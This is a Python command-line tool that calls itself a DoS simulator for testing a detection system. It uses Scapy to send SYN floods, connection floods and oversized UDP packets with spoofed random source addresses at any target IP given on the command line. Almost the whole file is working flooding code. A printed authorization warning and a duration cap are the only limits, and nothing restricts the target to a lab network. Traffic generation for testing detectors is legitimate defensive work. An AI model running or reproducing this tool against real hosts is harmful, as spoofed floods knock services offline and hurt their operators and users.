"""
DoS Simulator CLI - Command-line tool to generate DoS test traffic
Usage:
    python dos_simulator_cli.py --type syn_flood --target 127.0.0.1 --duration 10 --intensity 1.5
"""

import argparse
import threading
import time
from datetime import datetime
# import core send/conf from scapy and explicit protocol layers to satisfy static analyzers
from scapy.all import send, conf
from scapy.layers.inet import IP, TCP, UDP
from scapy.all import send, conf
from scapy.layers.inet import IP, TCP, UDP
from config import Config
import random

class CLISimulator:
    """Command-line DoS simulator"""
    
    def __init__(self):
        self.running = False
        self.packet_count = 0
        
    def simulate_high_request_rate(self, target_ip, duration, intensity):
        """High request rate simulation"""
        self.running = True
        self.packet_count = 0
        
        packets_per_sec = int(Config.MAX_REQUESTS_PER_SECOND * 1.5 * intensity)
        packet_interval = 1.0 / packets_per_sec if packets_per_sec > 0 else 0.001
        
        start_time = time.time()
        conf.verb = 0
        
        print(f"\n[*] Starting High Request Rate simulation")
        print(f"    Target: {target_ip}")
        print(f"    Duration: {duration}s")
        print(f"    Packets/sec: {packets_per_sec}")
        print(f"    Intensity: {intensity}x threshold")
        print("[*] Press Ctrl+C to stop\n")
        
        try:
            while self.running and (time.time() - start_time) < duration:
                src_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
                dst_port = random.randint(80, 65535)
                
                packet = IP(src=src_ip, dst=target_ip) / TCP(dport=dst_port, flags="S")
                
                try:
                    send(packet, verbose=0)
                    self.packet_count += 1
                    
                    # Progress indicator
                    if self.packet_count % 100 == 0:
                        elapsed = time.time() - start_time
                        rate = self.packet_count / elapsed if elapsed > 0 else 0
                        print(f"[+] {self.packet_count} packets sent ({rate:.0f} pkt/s)", end='\r')
                        
                except Exception as e:
                    print(f"[-] Send failed: {e}")
                    
                time.sleep(packet_interval)
                
            print(f"\n[✓] Sent {self.packet_count} packets in {time.time() - start_time:.2f}s\n")
            
        except KeyboardInterrupt:
            print(f"\n[!] Stopped. Sent {self.packet_count} packets\n")
        finally:
            self.running = False
            
    def simulate_connection_flood(self, target_ip, duration, intensity):
        """Connection flood simulation"""
        self.running = True
        self.packet_count = 0
        
        connections_per_sec = int(Config.MAX_CONNECTIONS_PER_IP * 1.5 * intensity)
        interval = 1.0 / connections_per_sec if connections_per_sec > 0 else 0.001
        
        start_time = time.time()
        conf.verb = 0
        
        print(f"\n[*] Starting Connection Flood simulation")
        print(f"    Target: {target_ip}")
        print(f"    Duration: {duration}s")
        print(f"    Connections/sec: {connections_per_sec}")
        print(f"    Intensity: {intensity}x threshold")
        print("[*] Press Ctrl+C to stop\n")
        
        try:
            while self.running and (time.time() - start_time) < duration:
                src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                
                packet = IP(src=src_ip, dst=target_ip) / TCP(dport=80, flags="S")
                
                try:
                    send(packet, verbose=0)
                    self.packet_count += 1
                    
                    if self.packet_count % 50 == 0:
                        elapsed = time.time() - start_time
                        rate = self.packet_count / elapsed if elapsed > 0 else 0
                        print(f"[+] {self.packet_count} connections ({rate:.0f} conn/s)", end='\r')
                        
                except Exception as e:
                    print(f"[-] Send failed: {e}")
                    
                time.sleep(interval)
                
            print(f"\n[✓] Simulated {self.packet_count} connections in {time.time() - start_time:.2f}s\n")
            
        except KeyboardInterrupt:
            print(f"\n[!] Stopped. Simulated {self.packet_count} connections\n")
        finally:
            self.running = False
            
    def simulate_syn_flood(self, target_ip, duration, intensity):
        """SYN flood simulation"""
        self.running = True
        self.packet_count = 0
        
        pkts_per_sec = int(Config.SYN_FLOOD_THRESHOLD * 1.5 * intensity)
        interval = 1.0 / pkts_per_sec if pkts_per_sec > 0 else 0.001
        
        start_time = time.time()
        conf.verb = 0
        
        print(f"\n[*] Starting SYN Flood simulation")
        print(f"    Target: {target_ip}")
        print(f"    Duration: {duration}s")
        print(f"    SYN packets/sec: {pkts_per_sec}")
        print(f"    Intensity: {intensity}x threshold")
        print("[*] Press Ctrl+C to stop\n")
        
        try:
            while self.running and (time.time() - start_time) < duration:
                src_ip = f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}"
                src_port = random.randint(10000, 65535)
                dst_port = random.randint(1, 65535)
                
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=src_port,
                    dport=dst_port,
                    flags="S",
                    seq=random.randint(0, 2**32-1)
                )
                
                try:
                    send(packet, verbose=0)
                    self.packet_count += 1
                    
                    if self.packet_count % 100 == 0:
                        elapsed = time.time() - start_time
                        rate = self.packet_count / elapsed if elapsed > 0 else 0
                        print(f"[+] {self.packet_count} SYN packets ({rate:.0f} pkt/s)", end='\r')
                        
                except Exception as e:
                    print(f"[-] Send failed: {e}")
                    
                time.sleep(interval)
                
            print(f"\n[✓] Sent {self.packet_count} SYN packets in {time.time() - start_time:.2f}s\n")
            
        except KeyboardInterrupt:
            print(f"\n[!] Stopped. Sent {self.packet_count} SYN packets\n")
        finally:
            self.running = False
            
    def simulate_packet_size(self, target_ip, duration, intensity):
        """Abnormal packet size simulation"""
        self.running = True
        self.packet_count = 0
        
        pkts_per_sec = int(50 * intensity)
        interval = 1.0 / pkts_per_sec if pkts_per_sec > 0 else 0.001
        
        start_time = time.time()
        conf.verb = 0
        
        print(f"\n[*] Starting Packet Size Attack simulation")
        print(f"    Target: {target_ip}")
        print(f"    Duration: {duration}s")
        print(f"    Packets/sec: {pkts_per_sec}")
        print(f"    Intensity: {intensity}x threshold")
        print("[*] Press Ctrl+C to stop\n")
        
        try:
            while self.running and (time.time() - start_time) < duration:
                src_ip = f"203.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                payload = b"X" * random.randint(10000, 65500)
                
                packet = IP(src=src_ip, dst=target_ip) / UDP(dport=53) / payload
                
                try:
                    send(packet, verbose=0)
                    self.packet_count += 1
                    
                    if self.packet_count % 20 == 0:
                        elapsed = time.time() - start_time
                        rate = self.packet_count / elapsed if elapsed > 0 else 0
                        print(f"[+] {self.packet_count} oversized packets ({rate:.1f} pkt/s)", end='\r')
                        
                except Exception as e:
                    print(f"[-] Send failed: {e}")
                    
                time.sleep(interval)
                
            print(f"\n[✓] Sent {self.packet_count} oversized packets in {time.time() - start_time:.2f}s\n")
            
        except KeyboardInterrupt:
            print(f"\n[!] Stopped. Sent {self.packet_count} packets\n")
        finally:
            self.running = False


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="DoS Simulator CLI - Generate test traffic for DoS detection system",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python dos_simulator_cli.py --type syn_flood --target 127.0.0.1 --duration 20 --intensity 2.0
  python dos_simulator_cli.py --type high_request_rate --target 192.168.1.1 --duration 10
  python dos_simulator_cli.py --type connection_flood --target 10.0.0.1 --intensity 1.5

Attack Types:
  high_request_rate  - Simulate high request rate attack
  connection_flood   - Simulate connection flood attack
  syn_flood          - Simulate SYN flood attack
  packet_size        - Simulate abnormal packet size attack

WARNING: Only use on networks you own or have permission to test!
        """
    )
    
    parser.add_argument(
        '--type',
        required=True,
        choices=['high_request_rate', 'connection_flood', 'syn_flood', 'packet_size'],
        help='Type of attack to simulate'
    )
    
    parser.add_argument(
        '--target',
        required=True,
        help='Target IP address'
    )
    
    parser.add_argument(
        '--duration',
        type=int,
        default=10,
        help='Duration in seconds (default: 10)'
    )
    
    parser.add_argument(
        '--intensity',
        type=float,
        default=1.5,
        help='Intensity multiplier (1.0=threshold, 2.0=2x threshold, default: 1.5)'
    )
    
    args = parser.parse_args()
    
    # Validate inputs
    try:
        parts = args.target.split('.')
        if len(parts) != 4 or not all(0 <= int(p) <= 255 for p in parts):
            print("[!] Invalid IP address format")
            return
    except ValueError:
        print("[!] Invalid IP address format")
        return
        
    if args.duration < 1 or args.duration > 300:
        print("[!] Duration must be between 1 and 300 seconds")
        return
        
    if args.intensity < 0.1 or args.intensity > 10:
        print("[!] Intensity must be between 0.1 and 10")
        return
    
    # Warn user
    print("\n" + "="*60)
    print("  ⚠️  DoS SIMULATOR - TESTING TOOL")
    print("="*60)
    print("\n❌ WARNING: Only use on networks you own or have authorization to test!")
    print("   Unauthorized testing may be illegal and unethical.\n")
    
    input("Press Enter to continue or Ctrl+C to cancel...")
    
    # Run simulator
    simulator = CLISimulator()
    
    try:
        if args.type == 'high_request_rate':
            simulator.simulate_high_request_rate(args.target, args.duration, args.intensity)
        elif args.type == 'connection_flood':
            simulator.simulate_connection_flood(args.target, args.duration, args.intensity)
        elif args.type == 'syn_flood':
            simulator.simulate_syn_flood(args.target, args.duration, args.intensity)
        elif args.type == 'packet_size':
            simulator.simulate_packet_size(args.target, args.duration, args.intensity)
    except PermissionError:
        print("\n[!] Error: Administrator/root privileges required to send packets")
        print("    Please run with: sudo python dos_simulator_cli.py ...\n")


if __name__ == '__main__':
    main()
